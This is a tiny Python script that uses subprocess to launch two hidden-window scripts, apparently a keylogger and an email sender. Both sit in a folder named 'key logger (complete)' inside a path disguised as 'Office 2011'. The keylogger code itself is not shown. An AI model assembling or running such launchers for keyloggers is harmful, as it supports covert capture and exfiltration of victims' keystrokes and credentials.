import subprocess

def run_script(script_path):
    subprocess.call(["python", script_path])

if __name__ == "__main__":
    script1_path = "C:\Office 2011\key logger (complete)\send_email.pyw"
    script2_path = "C:\Office 2011\key logger (complete)\python-keylogger.pyw"
    
    run_script(script1_path)
    run_script(script2_path)
